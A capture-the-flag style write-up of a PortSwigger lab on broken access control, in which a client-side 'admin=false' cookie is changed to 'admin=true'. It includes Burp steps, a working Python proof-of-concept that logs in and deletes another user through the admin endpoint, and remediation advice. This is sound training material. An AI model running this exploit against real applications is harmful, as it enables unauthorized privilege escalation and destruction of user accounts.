# User ID Controlled by Request Parameter with Data Leakage in Redirect / Admin Cookie Tampering — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-07-27

## The Problem

The application decided whether a logged-in user had admin privileges based on a **cookie value sent by the client** (e.g. `admin=false`) instead of checking the user's real role from a trusted, server-side source (like a database).

Since cookies are fully controlled by the client, this value can be freely edited before the request is sent.

## Discovery / Exploitation

1. Log in normally with a low-privileged account (`wiener` / `peter`)
2. Intercept the request using Burp Suite
3. Notice a cookie like `admin=false` being sent alongside the session cookie
4. Change its value to `admin=true`
5. Forward the modified request — the server trusts the client-supplied value and grants admin-level access, allowing actions like deleting another user (`carlos`)

## Impact

Any authenticated user can escalate their own privileges to admin simply by editing a cookie value — no real authorization check is performed by the server. This is a critical vertical privilege escalation vulnerability.

## Proof of Concept (Python)

This script logs in as the low-privileged user (handling the CSRF token required for login), then sends a request with a tampered `admin=true` cookie to delete another user without real admin rights.

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def get_csrf_token(s, url):
    r = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf


def delete_user(s, url):
    url_login = url + "/login"
    csrf_token = get_csrf_token(s, url_login)

    data = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    r = s.post(url_login, data=data, proxies=proxies, verify=False)
    res = r.text

    if "log out" in res:
        print("(+) log in successful")

        session_cookie = s.cookies.get_dict().get('session')

        delete_url = url + "/admin/delete?username=carlos"
        cookies = {'session': session_cookie, "admin": "true"}

        r = requests.get(delete_url, cookies=cookies, verify=False, proxies=proxies)

        if r.status_code == 200:
            print("(+) delete successful")
        else:
            print("(-) delete failed")
            sys.exit()

    else:
        print("(-) failed to log in")
        sys.exit()


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        sys.exit()

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Fetches the login page and extracts the CSRF token required to submit the login form
2. Logs in as the normal user (`wiener`) using a `requests.Session()` so cookies persist across requests
3. Checks the response for "log out" to confirm the login succeeded
4. Sends a request to the admin delete endpoint with a manually tampered `admin=true` cookie alongside the valid session cookie
5. Reports whether the privileged action succeeded

## Remediation

The server must never trust a client-supplied value (cookie, parameter, header) to determine privilege level. Instead, it must:
1. Authenticate the session
2. Look up the user's actual role from a trusted server-side source (e.g. the database) tied to that session
3. Only grant admin functionality if that server-side role check passes — regardless of what cookies the client sends

## Takeaway

This is the third variation of the same underlying flaw seen across these labs — the server always relied on something the client controls to decide "is this an admin?":

| Lab | Where the flag lived | How it was found |
|---|---|---|
| 1 | Predictable URL path | Guessed directly in the browser |
| 2 | Leaked in client-side JavaScript | Viewed page source |
| 3 | A client-supplied cookie value | Intercepted and tampered with Burp |

The pattern is always the same: **never trust the client** to self-report its own privilege level. Real access control must be enforced and verified entirely server-side.
